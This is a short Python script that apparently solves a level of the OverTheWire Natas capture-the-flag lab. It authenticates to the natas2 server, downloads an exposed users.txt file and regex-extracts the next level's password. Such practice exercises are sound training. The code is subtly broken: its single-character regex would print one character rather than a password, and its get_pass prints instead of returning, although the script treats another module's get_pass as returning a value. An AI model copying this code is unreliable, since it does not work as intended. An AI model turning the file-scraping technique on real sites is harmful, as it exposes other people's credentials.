import re
import requests
from requests.auth import HTTPBasicAuth
import natas1solution

auth = HTTPBasicAuth('natas2', natas1solution.get_pass())
def get_pass():
    r = requests.get('http://natas2.natas.labs.overthewire.org/files/users.txt', auth=auth)
    pass_regex = '[a-zA-Z0-9]'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == "__main__":
    get_pass()
